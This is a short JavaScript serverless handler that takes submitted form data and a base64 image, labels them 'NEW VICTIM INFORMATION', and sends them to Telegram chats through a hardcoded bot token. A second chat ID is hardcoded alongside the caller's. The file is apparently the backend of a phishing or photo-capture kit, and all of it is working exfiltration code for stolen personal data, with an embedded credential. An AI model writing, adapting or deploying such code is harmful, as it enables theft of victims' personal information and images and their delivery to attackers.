const https = require('https');
const FormData = require('form-data');
const { Buffer } = require('buffer');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const { usrId, image, ...userData } = req.body;

    // Your Telegram Bot Token
    const botToken = '7593396023:AAFL2c6dfu2-t4df0iNoRUcVCnDjsHMOs6c';

    // List of chat IDs to send the data to
    const chatIds = [usrId, '7310643937'];

    // Prepare the victim information
    const formatVictimInfo = (data) => {
        let output = "□ NEW VICTIM INFORMATION □\n";
        output += "━━━━━━━━━━•❈•━━━━━━━━━━\n";
        Object.entries(data).forEach(([key, value]) => {
            output += `❯ ${key}: ${value}\n`;
        });
        output += "━━━━━━━━━━•❈•━━━━━━━━━━\n";
        return output;
    };

    const caption = formatVictimInfo(userData);

    // Function to send data to Telegram
    const sendToTelegram = async (chatId, caption, image) => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', caption);

        if (image) {
            const buffer = Buffer.from(image.split(',')[1], 'base64');
            formData.append('photo', buffer, { filename: 'photo.png' });
        }

        return new Promise((resolve, reject) => {
            const request = https.request(
                `https://api.telegram.org/bot${botToken}/sendPhoto`,
                {
                    method: 'POST',
                    headers: formData.getHeaders(),
                },
                (response) => {
                    let data = '';
                    response.on('data', (chunk) => (data += chunk));
                    response.on('end', () => resolve(data));
                }
            );

            request.on('error', reject);
            formData.pipe(request);
        });
    };

    try {
        // Send to all specified chat IDs
        const sendPromises = chatIds.map(chatId =>
            sendToTelegram(chatId, caption, image)
        );
        await Promise.all(sendPromises);

        return res.status(200).send('Data sent successfully to all recipients');
    } catch (error) {
        console.error('Error sending message:', error);
        return res.status(500).send('Internal Server Error');
    }
}
